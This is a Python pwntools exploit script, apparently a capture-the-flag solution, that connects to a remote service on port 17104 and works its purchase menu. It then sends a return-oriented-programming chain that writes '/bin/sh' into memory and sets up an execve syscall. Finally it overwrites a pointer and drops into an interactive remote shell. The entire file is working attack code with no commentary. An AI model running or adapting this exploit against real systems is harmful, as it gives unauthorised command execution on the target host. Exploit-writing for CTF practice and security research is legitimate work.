#!/usr/bin/env python3

from pwn import *
import sys

IP = sys.argv[1]
PORT = 17104

r = remote(IP, PORT)

def get_ropchain():
    ropchain = p64(0x000000000040fd9e) # pop rsi ; ret
    ropchain += p64(0x00000000004e10e0) # @ .data
    ropchain += p64(0x000000000045aef7) # pop rax ; ret
    ropchain += b'/bin/sh\x00'
    ropchain += p64(0x00000000004a0485) # mov qword ptr [rsi], rax ; ret
    ropchain += p64(0x000000000040fd9e) # pop rsi ; ret
    ropchain += p64(0x00000000004e10e8) # @ .data + 8
    ropchain += p64(0x000000000044fae9) # xor rax, rax ; ret
    ropchain += p64(0x00000000004a0485) # mov qword ptr [rsi], rax ; ret
    ropchain += p64(0x000000000040199a) # pop rdi ; ret
    ropchain += p64(0x00000000004e10e0) # @ .data
    ropchain += p64(0x000000000040fd9e) # pop rsi ; ret
    ropchain += p64(0x00000000004e10e8) # @ .data + 8
    ropchain += p64(0x000000000040189f) # pop rdx ; ret
    ropchain += p64(0x00000000004e10e8) # @ .data + 8
    ropchain += p64(0x000000000044fae9) # xor rax, rax ; ret
    ropchain += p64(0x0000000000495b00) * 19 #
    ropchain += p64(0x0000000000495ae7)
    ropchain += p64(0x00000000004012e3) 
    return ropchain
    
r.recvuntil("> ")
r.sendline(b"1")
r.recvuntil("buy: ")
r.sendline(b"1512")
r.recvuntil("> ")
r.sendline(b"3")
r.recvuntil(": ")
r.sendline(b"0")
r.recvuntil(": ")
r.sendline(get_ropchain())
    
r.recvuntil("> ")
r.send(p64(0x04E3208))
r.recvuntil(": ")
r.sendline(str(u64(p64(0x47a90e))))

r.interactive()
